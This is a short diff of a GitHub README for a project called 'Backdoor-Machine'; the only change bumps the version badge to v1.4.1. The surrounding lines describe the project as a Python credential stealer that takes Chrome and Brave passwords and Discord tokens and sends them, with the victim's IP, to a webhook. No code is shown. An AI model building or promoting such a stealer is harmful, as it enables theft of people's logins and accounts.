@@ -2,7 +2,7 @@
 ![GitHub last commit](https://img.shields.io/github/last-commit/CUPZYY/Backdoor-Machine?style=for-the-badge)
 ![GitHub repo size](https://img.shields.io/github/repo-size/CUPZYY/Backdoor-Machine?style=for-the-badge)
 ![Lines of code](https://img.shields.io/tokei/lines/github/CUPZYY/Backdoor-Machine?style=for-the-badge)
-![version](https://img.shields.io/badge/version-v1.4-blue?style=for-the-badge)
+![version](https://img.shields.io/badge/version-v1.4.1-blue?style=for-the-badge)
 
 A program made in python for stealing passwords and usernames from Google Chrome/Brave and tokenlog the user's discord.
 It will send a message in a webhook, with all the tokens, login info, ip and so on.
